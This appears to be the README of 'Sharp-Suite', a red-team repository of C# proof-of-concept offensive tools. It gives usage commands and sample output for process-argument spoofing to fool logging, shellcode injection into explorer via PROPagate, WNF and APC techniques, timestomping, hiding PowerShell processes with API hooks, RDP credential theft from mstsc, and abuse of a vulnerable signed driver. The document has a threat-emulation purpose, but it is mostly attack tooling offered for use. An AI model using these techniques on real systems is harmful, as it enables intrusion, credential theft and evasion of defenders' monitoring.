# Sharp-Suite

The king is dead, long live the king. I am starting a new repo with code samples in C#. My heart is still with PowerShell <3, lets face it using in-line C# in PowerShell is a much nicer experience than actually using C#! However, threat emulation has to evolve over time and so does the tooling.

## Pwn?

### SwampThing

SwampThing lets you to spoof process command line args (x32/64). Essentially you create a process in a suspended state, rewrite the PEB, resume and finally revert the PEB. The end result is that logging infrastructure will record the fake command line args instead of the real ones. Think for example about launching a wmic xsl stylesheet for code execution but faking an innocuous wmic command.

```
C:\>SwampThing.exe -l C:\Windows\System32\notepad.exe -f C:\aaa.txt -r C:\bbb.txt
      /
     :;                \
     |l      _____     |;
     `8o __-~     ~\   d|     Swamp
      "88p;.  -._\_;.oP         Thing
       `>,% (\  (\./)8"
      ,;%%%:  ./V^^^V'
;;;,-::::::'_::\   ||\
8888oooooo.  :\`^^^/,,~--._
 oo.8888888888:`((( o.ooo888
   `o`88888888b` )) 888b8888
     b`888888888;(.,"888b888\
....  b`8888888:::::.`8888.
 `:::. `:::OOO:::::::.`OO' ;
   `.      "``::::::''.'        ~ b33f ~

[>] CreateProcess -> Suspended
[+] PE Arch                       : 64-bit
[+] Process Id                    : 10568
[+] PEB Base                      : 0xA3C2431000
[+] RTL_USER_PROCESS_PARAMETERS   : 0x20DA9760000
[+] CommandLine                   : 0x20DA9760070
[+] UNICODE_STRING |-> Len        : 66
                   |-> MaxLen     : 68
                   |-> pBuff      : 0x20DA9760658

[>] Rewrite -> RTL_USER_PROCESS_PARAMETERS
[+] RtlCreateProcessParametersEx  : 0xEAADF0
[+] RemoteAlloc                   : 0xEA0000
[+] Size                          : 1776
[?] Success, sleeping 500ms..

[>] Reverting RTL_USER_PROCESS_PARAMETERS
[+] Local UNICODE_STRING          : 0xEBC4D0
[+] Remote UNICODE_STRING.Buffer  : 0x20DA9B10000
[+] pRTL_USER_PROCESS_PARAMETERS  : 0x20DA9870FE0
[?] Success rewrote Len, MaxLen, Buffer..
```

### DesertNut

DesertNut is a proof-of-concept for code injection using subclassed window callbacks (more commonly known as PROPagate). The pertinent part here is that this does not use any suspect thread creation API's, instead as implied it hijacks window callbacks. DesertNut includes two flags: "-l" to list all potential properties that could be hijacked and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10 RS5 & Win7) since it requires custom shellcode with a specific callback function prototype. For further details please see [this post](http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/) by Hexacorn and [this post](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/) by modexp.

```
C:\> DesertNut.exe -i
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''

[+] Searching for Subclass property..
[>] PID: 10928, ImageName: explorer
    |-> ParentClassName: Progman, ChildClassName: SHELLDLL_DefView
[+] Duplicating Subclass header..
[>] hProc: 0x378
[>] hProperty: 0x6B14DD0
    |-> uRefs: 2, uAlloc: 3, uCleanup: 0
    |-> dwThreadId: 5804, pFrameCur: 0
    |-> pfnSubclass: 0x7FFA20E42280 --> comctl32!CallOriginalWndProc (?)
    |-> uIdSubclass: 0, dwRefData: 0x7FFA2E4C07D0
[+] Allocating remote shellcode..
    |-> Sc Len: 344
    |-> Sc Address: 0x3220000
[+] Rewriting local SUBCLASS_HEADER..
[+] Allocating remote SUBCLASS_HEADER..
    |-> Subclass header Len: 48
    |-> Subclass header Address: 0x3260000
[+] Updating original UxSubclassInfo subclass procedure..
[+] Trigger remote shellcode --> notepad..
[+] Restoring original UxSubclassInfo subclass procedure..
[+] Freeing remote SUBCLASS_HEADER & shellcode..

C:\> DesertNut.exe -l
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''


[+] Subclassed Window Properties
[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84BF0, hParentWnd: 0xA0710, hChildWnd: 0x100650
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: Start

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84C70, hParentWnd: 0xA0710, hChildWnd: 0x1C064C
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: TrayDummySearchControl

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A64F0, hParentWnd: 0x1C064C, hChildWnd: 0x800E8
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Button

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A58F0, hParentWnd: 0x1C064C, hChildWnd: 0x1504A4
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Static

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A5870, hParentWnd: 0x1C064C, hChildWnd: 0x110814
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: ToolbarWindow32

[...Snipped...]
```

### WindfarmDynamite

WindfarmDynamite is a proof-of-concept for code injection using the Windows Notification Facility (WNF). Of interest here is that this avoids suspect thread orchestration APIs (like CreateRemoteThread). The POC overwrites a process level WNF subscription callback which can be triggered by signaling a WNF state name. There currently exists little functionality in Windows to monitor WNF activity. WindfarmDynamite includes two flags: "-l PID" to list all WNF subscriptions for a specific process and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10). For further details please see [this talk](https://www.youtube.com/watch?v=MybmgE95weo) by Alex Ionescu & Gabrielle Viala and [this post](https://modexp.wordpress.com/2019/06/15/4083/) by modexp.

```
C:\> WindfarmDynamite.exe -i
.  ..  ..___           .__                 ,
|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
                           ._|

[+] Validating Process..
[>] PID: 996, ImageName: explorer
    |-> hProc: 632, Arch: x64

[+] Leaking local WNF_SUBSCRIPTION_TABLE..
[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208

[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x5A9120
    |-> NameTable Flink: 0x4A6CA10, NameTable Blink: 0x5BB050

[+] Finding remote subscription -> WNF_SHEL_LOGON_COMPLETE
[>] SubscriptionId: 0xB89, State Name: WNF_SHEL_LOGON_COMPLETE
    |-> WNF_USER_SUBSCRIPTION: 0x49C8E38
    |-> Callback: 0x7FFD82F58C60 => twinui.dll!DllCanUnloadNow
    |-> Context: 0x2A12F40 => N/A

[+] Allocating remote shellcode..
[>] Sc Len: 344
[>] Sc Address: 0x27A0000

[+] Rewriting WNF subscription callback pointer..
[+] NtUpdateWnfStateData -> Trigger shellcode
[+] Restoring WNF subscription callback pointer & deallocating shellcode..

C:\> WindfarmDynamite.exe -l 4132
.  ..  ..___           .__                 ,
|  ||\ |[__  _.._.._ _ |  \  .._  _.._ _ *-+- _
|/\|| \||   (_][  [ | )|__/\_|[ )(_][ | )| | (/,
                           ._|

[+] Validating Process..
[>] PID: 4132, ImageName: vmtoolsd
    |-> hProc: 640, Arch: x64

[+] Leaking local WNF_SUBSCRIPTION_TABLE..
[>] TblPtr: 0x7FFD99CB5FA8, NtdllRVA: 1335208

[+] Remote WNF_SUBSCRIPTION_TABLE lookup..
[>] rNtdllBase: 0x7FFD99B70000, rWNFSubTable: 0x56B2F0
    |-> NameTable Flink: 0x58EA30, NameTable Blink: 0x58F070

[+] Reading remote WNF subscriptions..
[>] SubscriptionId: 0x931, State Name: WNF_ENTR_EDPENFORCEMENTLEVEL_POLICY_VALUE_CHANGED
    |-> WNF_USER_SUBSCRIPTION: 0x4BB5B88
    |-> Callback: 0x7FFD87505DF0 => edputil.dll!EdpIsUIPolicyEvaluationEnabledForThread
    |-> Context: 0x0 => N/A

[>] SubscriptionId: 0x8FA, State Name: WNF_DX_MODE_CHANGE_NOTIFICATION
    |-> WNF_USER_SUBSCRIPTION: 0x5B9658
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F9, State Name: WNF_DX_MONITOR_CHANGE_NOTIFICATION
    |-> WNF_USER_SUBSCRIPTION: 0x5B9708
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F8, State Name: WNF_SPI_LOGICALDPIOVERRIDE
    |-> WNF_USER_SUBSCRIPTION: 0x5BA368
    |-> Callback: 0x7FFD96E5B230 => SHCore.dll!Ordinal126
    |-> Context: 0xA1ECB0 => N/A

[>] SubscriptionId: 0x8F4, State Name: WNF_RPCF_FWMAN_RUNNING
    |-> WNF_USER_SUBSCRIPTION: 0x58F828
    |-> Callback: 0x7FFD98610980 => rpcrt4.dll!NdrTypeSize
    |-> Context: 0x0 => N/A
```

### MaceTrap

MaceTrap is a proof-of-concept for time stomping using SetFileTime. MaceTrap allows you to set the CreationTime / LastAccessTime / LastWriteTime for arbitrary files and folders. These elements can be changed individually, in bulk or can be duplicated from an existing file or folder. Time permitting I will update MaceTrap to include comprehensive PE compile time stomping as well (header, import table, export table, debug directory, resources and fixing up the checksum).

```
C:\> MaceTrap.exe

    /-|-\   MACE
   [++++||<<>><<>>|===|+
    \-|-/    TRAP             ~b33f~


 >--~~--> Args? <--~~--<

-l (-List)        List FileTime information for a file or folder
-s (-Set)         Set FileTime information for a file or folder
-d (-Duplicate)   Duplicate FileTime information from a file or folder
-t (Time)         String DateTime representation; requires quotes if it contains spaces. All
                  undefined elements are set randomly (YYYY-MM-DD is required!):
                    =>  1999-10-20
                    => "2001-01-02 14:13"
                    => "2019-02-19 01:01:01.111"
-c (-Create)      Boolean flag, overwrite CreationTime
-a (-Access)      Boolean flag, overwrite LastAccessTime
-w (-Write)       Boolean flag, overwrite LastWriteTime

 >--~~--> Usage? <--~~--<

# List all FileTime elements
MaceTrap.exe -l C:\Windows\System32\kernel32.dll
# TimeStomp all FileTime elements
MaceTrap.exe -s C:\Some\Target\file.folder -t "2019-02-19 01:01:01,111"
# TimeStomp CreationTime & LastWriteTime; here HH:MM:SS,MS are randomized
MaceTrap.exe -s C:\Some\Target\file.folder -t 1999-09-09 -c -w
# TimeStomp a file/folder by duplicating the FileTime information from an existing file/folder
MaceTrap.exe -s C:\Some\Target\file.folder -d C:\Windows\System32\kernel32.dll
```

### UrbanBishop

UrbanBishop is a small POC I wrote while I was testing [Donut](https://github.com/TheWover/donut). If you haven't seen or used Donut I highly recommend you have a look at the magic TheWover & odzhan are doing there! This POC creates a local RW section in UrbanBishop and then maps that section as RX into a remote process. Once the shared section has been established the shellcode is written to the local section which then automatically propagates to the remote process. For execution UrbanBishop creates a remote suspended thread (start address is set to ntdll!RtlExitUserThread) and queues and APC on that thread, once resumed with NtAlertResumeThread the shellcode executes and the thread exits gracefully on completion. The POC can be adapted for inline shellcode but that was not my use case. I tested UrbanBishop on x64 Win10/Win7.

```
C:\> UrbanBishop.exe -i 3380 -p C:\Users\b33f\Desktop\sc.bin -c
   _O       _____     _
  / //\    |  |  |___| |_ ___ ___
 {     }   |  |  |  _| . | .'|   |
  \___/    |_____|_| |___|__,|_|_|
  (___)
   |_|          _____ _     _
  /   \        | __  |_|___| |_ ___ ___
 (_____)       | __ -| |_ -|   | . | . |
(_______)      |_____|_|___|_|_|___|  _|
/_______\                          |_|
                       ~b33f~

|--------
| Process    : notepad
| Handle     : 828
| Is x32     : False
| Sc binpath : C:\Users\b33f\Desktop\sc.bin
|--------

[>] Creating local section..
    |-> hSection: 0x338
    |-> Size: 31361
    |-> pBase: 0x2470000
[>] Map RX section to remote proc..
    |-> pRemoteBase: 0x16967970000
[>] Write shellcode to local section..
    |-> Size: 31361
[>] Seek export offset..
    |-> pRemoteNtDllBase: 0x7FFDE64A0000
    |-> LdrGetDllHandle OK
    |-> RtlExitUserThread: 0x7FFDE650CF10
    |-> Offset: 0x6CF10
[>] NtCreateThreadEx -> RtlExitUserThread <- Suspended..
    |-> Success
[>] Set APC trigger & resume thread..
    |-> NtQueueApcThread
    |-> NtAlertResumeThread
[>] Waiting for payload to finish..
    |-> Thread exit status -> 0
    |-> NtUnmapViewOfSection
```

### AtomicBird

AtmoicBird, is a crude POC to demo the use of [EasyHook](https://easyhook.github.io/) in .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. AtomicBird has two functions, (1) Hook MessageBoxA => print to console / modify parameters => unhook and (2) Hook NtQuerySystemInformation->SystemProcessInformation, search the linked list of SYSTEM_PROCESS_INFORMATION Structs to find powershell processes and unlink them. The second function requires that you inject the .Net PE into a process that uses NtQuerySystemInformation (Process Explorer was used for testing), you can do that with execute-assembly or with donut by generating shellcode. AtmoicBird was only tested on x64 Win10.

```

              .---.        .-----------
             /     \  __  /    ------
            / /     \(  )/    -----  Atomic
           //////   ' \/ `   ---       Bird
          //// / // :    : ---
         // /   /  /`    '--
        //          //..\\      ~b33f~
               ====UU====UU====
                   '//||\\`
                     ''``
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
Called ==> SystemProcessInformation
[!] Found Powershell => rewriting linked list
[!] Found Powershell => rewriting linked list

[...Snipped...]
```

### RemoteViewing

RemoteViewing, is quick POC to demo RDP credential theft through API hooking using [EasyHook](https://easyhook.github.io/) for .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. This is adapted from a post by [@0x09AL](https://twitter.com/0x09AL) that you can read [here](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/). To use this you have to compile RemoteViewing and then turn it into shellcode with [Donut](https://github.com/TheWover/donut) after which you have to inject that shellcode into mstsc. RemoteViewing will RC2 encrypt any credentials it captures and write them to disk. You can then use Clairvoyant to decrypt the file in memory, read out the results and delete the file.

### Londor

Londor is a small toolkit which wraps [frida-clr](https://github.com/frida/frida). I initially wanted to create a tool which would allow you to generate DynamoRIO coverage files but I also ported some code from [Fermion](https://github.com/FuzzySecurity/Fermion) to provide some more generic JScript injection capabilities. Note: There are some color palette bugs in Londor that I left unfixed (not my problem & does not affect usability) so if you use it in different terminal flavors you will see some wacky color combos. I may return to this at some point when I have ∆-freeTime.

```
C:\> Londor.exe
    __              _
   |  |   ___ ___ _| |___ ___
   |  |__| . |   | . | . |  _|
   |_____|___|_|_|___|___|_|

                         ~b33f


  >--~~--> Args? <--~~--<

 --help   (-h)    Show this help message.
 --type   (-t)    Instrumentation type: Coverage, Script.
 --out    (-o)    Full output path for DRCOV file.
 --path   (-p)    Full path to JS script.
 --pid    (-pid)  PID of the process to attach to.
 --name   (-n)    Substring name of process to attach to.
 --start  (-s)    Full path to binary to launch.
 --args   (-a)    Args to pass to binary.

  >--~~--> Usage? <--~~--<


 # Generate coverage information for a process
 Londor.exe -t Coverage -pid 123 -o C:\Some\Out\Path.drcov
 Londor.exe -t Coverage -n notepad -o C:\Some\Out\Path.drcov
 Londor.exe -t Coverage -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -o C:\Some\Out\Path.drcov

 # Inject JS script into process
 Londor.exe -t Script -pid 123 -p C:\Some\Path\To\Script.js
 Londor.exe -t Script -n notepad -p C:\Some\Path\To\Script.js
 Londor.exe -t Script -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -p C:\Some\Path\To\Script.js
 

C:\> Londor.exe -t Coverage -s "C:\Windows\System32\notepad.exe" -o C:\Users\b33f\Desktop\test.drcov -a "C:\Users\b33f\Desktop\bla.txt"
    __              _
   |  |   ___ ___ _| |___ ___
   |  |__| . |   | . | . |  _|
   |_____|___|_|_|___|___|_|

                         ~b33f


[>] Spawning process for coverage..
    |-> PID: 5260; Path: C:\Windows\System32\notepad.exe
    |-> Script loaded

[*] Press ctrl-c to detach..

[+] Block trace Length: 107160
    |-> BBS slice: 13395; Total BBS: 13395
[+] Block trace Length: 18456
    |-> BBS slice: 2307; Total BBS: 15702
[+] Block trace Length: 76032
    |-> BBS slice: 9504; Total BBS: 25206
[+] Block trace Length: 22216
    |-> BBS slice: 2777; Total BBS: 27983
[+] Block trace Length: 20248
    |-> BBS slice: 2531; Total BBS: 30514
[+] Block trace Length: 32
    |-> BBS slice: 4; Total BBS: 30518

[?] Unloading hooks, please wait..
    |-> Wrote trace data to file
```

### VirtToPhys

VirtToPhys is a small POC to demonstrate how you can calculate the physical address for a kernel virtual address when exploiting driver bugs that allow you to map physical memory. VirtToPhys uses MsIo.sys, a WHQL signed driver that gives you colorful lights on your RAM (?lolwut), [CVE-2019-18845](https://github.com/active-labs/Advisories/blob/master/2019/ACTIVE-2019-012.md). Hat tips and full credits to [@UlfFrisk](https://twitter.com/UlfFrisk) for his very insightful [MemProcFS](https://github.com/ufrisk/MemProcFS) project and [@hFireF0X](https://twitter.com/hFireF0X) for [KDU](https://github.com/hfiref0x/KDU).

```
C:\> VirtToPhys.exe -l
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[?] Loading MsIo driver..
[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
    |-> Success
[>] Driver Nt path: \??\C:\Windows\System32\MsIo64.sys
[>] Driver registration: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsIoTest
[?] NtLoadDriver -> Success
[+] Driver load: OK

C:\> VirtToPhys.exe -v 0xffffd20fc9a5f440
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[*] MsIO driver handle: 604
[?] Leaking PML4..
[+] PML4 in lowstub --> 1AB000
[?] Converting VA -> PA
    |-> PhysAddress: 7E25F440

C:\> VirtToPhys.exe -u
 _   _ _      _ _____    ______ _
| | | (_)    | |_   _|   | ___ \ |
| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
 \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
                                       __/ |
                                      |___/

                                         ~b33f
[+] Running as Administrator
[>] Executing on x64
[?] UnLoading MsIo driver..
[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
    |-> Success
[+] NtUnloadDriver -> Success
[+] Driver deleted from disk
[+] Driver service artifacts deleted
[?] Driver unload: OK
```

## Windows API

### GetAPISetMapping

This project parses the PEB to match Windows API Set DLL's to their host DLL. This code is adapted from [Lunar](https://github.com/Dewera/Lunar/) by [@fakedewera](https://twitter.com/fakedewera).

```
C:\> GetAPISetMapping.exe
 >--~~--> Args? <--~~--<

-List   (-l)       Boolean: List all know API Set mappings.
-Search (-s)       String: Perform string match based on partial or full API Set name.

 >--~~--> Usage? <--~~--<

GetAPISetMapping.exe -l
GetAPISetMapping.exe -s "api-ms-win-appmodel-state-l1-2-0.dll"

C:\> GetAPISetMapping.exe -s "win-dx-d3dkmt"
API Set: api-ms-win-dx-d3dkmt-l1-1-5.dll  -->  gdi32.dll
API Set: ext-ms-win-dx-d3dkmt-dxcore-l1-1-0.dll  -->  dxcore.dll
API Set: ext-ms-win-dx-d3dkmt-gdi-l1-1-0.dll  -->  gdi32.dll

C:\> GetAPISetMapping.exe -l
API Set: api-ms-onecoreuap-print-render-l1-1-0.dll  -->  printrenderapihost.dll
API Set: api-ms-win-appmodel-identity-l1-2-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-runtime-internal-l1-1-6.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-runtime-l1-1-3.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-state-l1-1-2.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-state-l1-2-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-appmodel-unlock-l1-1-0.dll  -->  kernel.appcore.dll
API Set: api-ms-win-base-bootconfig-l1-1-0.dll  -->  advapi32.dll
API Set: api-ms-win-base-util-l1-1-0.dll  -->  advapi32.dll
API Set: api-ms-win-composition-redirection-l1-1-0.dll  -->  dwmredir.dll
API Set: api-ms-win-composition-windowmanager-l1-1-0.dll  -->  udwm.dll
API Set: api-ms-win-containers-cmclient-l1-1-1.dll  -->  cmclient.dll

[...Snipped...]
```

### SystemProcessAndThreadsInformation

While working on a side project I had to access out-of-process thread information, to do this I used NtQuerySystemInformation -> SystemProcessAndThreadInformation. As it may be helpful for reference I wrote a small wrapper round this function to list process and thread information for a specific PID. Note that I am not extracting all available information from SYSTEM_PROCESSES and SYSTEM_THREAD_INFORMATION, feel free to extend the output with a pull request.

```
C:\> SystemProcessAndThreadsInformation.exe -p 4508

[+] Process Details
    ImageName           : powershell.exe
    ProcessId           : 4508
    ParentPid           : 8256
    HandleCount         : 701
    ThreadCount         : 25
    SessionId           : 1
    Priority            : 8
    CreateTime          : 0d:22h:0m:31s:876ms
    UserTime            : 0d:0h:0m:0s:328ms
    KernelTime          : 0d:0h:0m:0s:281ms
    WorkingSetSize      : 73.52734375 MB
    PeakWorkingSetSize  : 73.5859375 MB
    PageFaultCount      : 26896

[+] Thread Details
[>] TID: 9832, Priority: 9
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:876ms, uTime: 0d:0h:0m:0s:46ms, kTime: 0d:0h:0m:0s:93ms
    |-> WaitTime: 5843708, WaitReason: UserRequest
    |-> State: Wait, ContextSwitches: 232

[>] TID: 5552, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:15ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 38

[>] TID: 15716, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:0ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 30

[...Snipped...]
```